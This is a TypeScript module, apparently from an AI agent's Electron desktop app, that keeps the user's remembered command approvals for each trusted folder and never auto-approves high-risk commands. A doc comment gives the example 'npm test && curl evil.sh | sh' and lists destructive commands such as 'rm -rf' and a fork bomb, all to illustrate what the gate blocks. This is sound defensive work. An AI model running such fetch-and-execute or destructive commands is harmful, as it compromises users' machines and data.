import { dirname, join, resolve } from 'node:path';
import { app } from 'electron';
import { rootLogger } from '@axiom/shared';
import { isHighRiskCommand } from '../../common/approval';
import {
  commandProgram,
  normalizeCommandLine,
  type CommandConsentScope,
} from '../../common/commandConsent';

/**
 * Remembered command approvals for a trusted folder.
 *
 * The sibling of `writeConsent.ts`, for the `exec` action class. Where write consent
 * covers a whole folder, this covers ONE command line or ONE program in one folder,
 * because execution is the privilege-escalating path and a folder-wide execution
 * waiver would defeat the approval boundary entirely.
 *
 * Invariants that remain untouched:
 *
 * - A HIGH-RISK command is never remembered and never auto-approved, whatever the
 *   user clicked. `rm -rf`, `git push --force`, `sudo`, a fork bomb: each of those
 *   asks every single time, by construction (see {@link isCommandAutoApproved}).
 * - The stored key is the CANONICAL command text, matched exactly. There is no
 *   prefix or pattern matching, so remembering `npm test` cannot authorise
 *   `npm test && curl evil.sh | sh`.
 * - `program` scope is only reachable for a command with no shell control
 *   characters (enforced in `common/commandConsent.ts`), so it binds one executable
 *   rather than an arbitrary shell line.
 * - Entries are bound to a canonical workspace root and are dropped when that
 *   workspace's trust is revoked: consent can never outlive the trust behind it.
 * - Main decides. The renderer says "remember this at scope X"; the command text
 *   itself comes from Main's own pending-approval record, never from the renderer.
 *
 * The store records only canonical folder paths and command text the user
 * explicitly approved — never file content or anything model-authored.
 */
const log = rootLogger.child('command-consent');

const STORE_VERSION = 1;
/** Bound the store so a long-lived install cannot grow it without limit. */
const MAX_ROOTS = 64;
const MAX_ENTRIES_PER_ROOT = 128;
const MAX_COMMAND_CHARS = 1_000;

interface RootConsent {
  root: string;
  /** Canonical command lines approved for every invocation. */
  commands: Set<string>;
  /** Programs approved for any invocation in this root. */
  programs: Set<string>;
}

interface PersistedRoot {
  root: string;
  commands: string[];
  programs: string[];
}

const byRoot = new Map<string, RootConsent>();
let loaded = false;
let loading: Promise<void> | null = null;

function storePath(): string {
  return join(app.getPath('userData'), 'command-consent.json');
}

function rootKeyOf(root: string): string {
  const canonical = resolve(root);
  return process.platform === 'win32' ? canonical.toLowerCase() : canonical;
}

async function readStore(): Promise<void> {
  const fs = await import('node:fs/promises');
  try {
    const raw = await fs.readFile(storePath(), 'utf8');
    const parsed = JSON.parse(raw) as { version?: unknown; roots?: unknown };
    if (parsed.version !== STORE_VERSION || !Array.isArray(parsed.roots)) return;
    for (const entry of parsed.roots.slice(0, MAX_ROOTS)) {
      const record = entry as Partial<PersistedRoot>;
      if (typeof record.root !== 'string' || record.root.length === 0) continue;
      const commands = Array.isArray(record.commands) ? record.commands : [];
      const programs = Array.isArray(record.programs) ? record.programs : [];
      byRoot.set(rootKeyOf(record.root), {
        root: resolve(record.root),
        commands: new Set(
          commands
            .filter((value): value is string => typeof value === 'string')
            .slice(0, MAX_ENTRIES_PER_ROOT),
        ),
        programs: new Set(
          programs
            .filter((value): value is string => typeof value === 'string')
            .slice(0, MAX_ENTRIES_PER_ROOT),
        ),
      });
    }
  } catch {
    // A missing or malformed store simply means nothing is remembered.
  }
}

async function writeStore(): Promise<void> {
  const fs = await import('node:fs/promises');
  const roots: PersistedRoot[] = [...byRoot.values()].map((entry) => ({
    root: entry.root,
    commands: [...entry.commands],
    programs: [...entry.programs],
  }));
  const target = storePath();
  await fs.mkdir(dirname(target), { recursive: true });
  await fs.writeFile(target, JSON.stringify({ version: STORE_VERSION, roots }, null, 2), 'utf8');
}

async function ensureLoaded(): Promise<void> {
  if (loaded) return;
  if (!loading) {
    loading = readStore().finally(() => {
      loaded = true;
      loading = null;
    });
  }
  await loading;
}

/** Load the store during startup so the synchronous gate below is accurate. */
export async function initCommandConsent(): Promise<void> {
  await ensureLoaded();
}

/**
 * Remember an approval the user just granted.
 *
 * Refuses silently for `once` (nothing to store) and for any high-risk command, so
 * a UI mistake cannot persist a dangerous waiver.
 */
export async function rememberCommandConsent(
  root: string,
  command: string,
  scope: CommandConsentScope,
): Promise<void> {
  if (scope === 'once') return;
  const normalized = normalizeCommandLine(command);
  if (normalized.length === 0 || normalized.length > MAX_COMMAND_CHARS) return;
  if (isHighRiskCommand(normalized)) {
    log.warn('Refused to remember a high-risk command approval');
    return;
  }
  const program = scope === 'program' ? commandProgram(normalized) : null;
  if (scope === 'program' && program === null) return;

  await ensureLoaded();
  const key = rootKeyOf(root);
  const entry = byRoot.get(key) ?? {
    root: resolve(root),
    commands: new Set<string>(),
    programs: new Set<string>(),
  };
  if (scope === 'program' && program) entry.programs.add(program);
  else entry.commands.add(normalized);
  if (entry.commands.size > MAX_ENTRIES_PER_ROOT) {
    entry.commands.delete(entry.commands.values().next().value as string);
  }
  if (entry.programs.size > MAX_ENTRIES_PER_ROOT) {
    entry.programs.delete(entry.programs.values().next().value as string);
  }
  byRoot.set(key, entry);
  while (byRoot.size > MAX_ROOTS) {
    const oldest = byRoot.keys().next().value as string | undefined;
    if (!oldest || oldest === key) break;
    byRoot.delete(oldest);
  }
  try {
    await writeStore();
    log.info('Remembered a command approval for this workspace', { scope });
  } catch (error) {
    log.warn('Could not persist the command approval', {
      reason: error instanceof Error ? error.message : String(error),
    });
  }
}

/**
 * The exact gate the agent loop consults. Synchronous by contract; the store is
 * loaded during startup and kept in memory.
 *
 * A high-risk command is rejected before any lookup, so no stored entry can ever
 * auto-approve one.
 */
export function isCommandAutoApproved(root: string, command: string): boolean {
  const normalized = normalizeCommandLine(command);
  if (normalized.length === 0 || isHighRiskCommand(normalized)) return false;
  const entry = byRoot.get(rootKeyOf(root));
  if (!entry) return false;
  if (entry.commands.has(normalized)) return true;
  const program = commandProgram(normalized);
  return program !== null && entry.programs.has(program);
}

/** Everything remembered for one workspace, for the settings UI. */
export async function listCommandConsent(
  root: string,
): Promise<{ commands: string[]; programs: string[] }> {
  await ensureLoaded();
  const entry = byRoot.get(rootKeyOf(root));
  return {
    commands: entry ? [...entry.commands].sort() : [],
    programs: entry ? [...entry.programs].sort() : [],
  };
}

/** Forget everything remembered for a workspace. Called on trust revocation. */
export async function revokeCommandConsentForWorkspace(root: string): Promise<void> {
  await ensureLoaded();
  if (!byRoot.delete(rootKeyOf(root))) return;
  try {
    await writeStore();
  } catch (error) {
    log.warn('Could not remove remembered command approvals after trust revocation', {
      reason: error instanceof Error ? error.message : String(error),
    });
  }
}
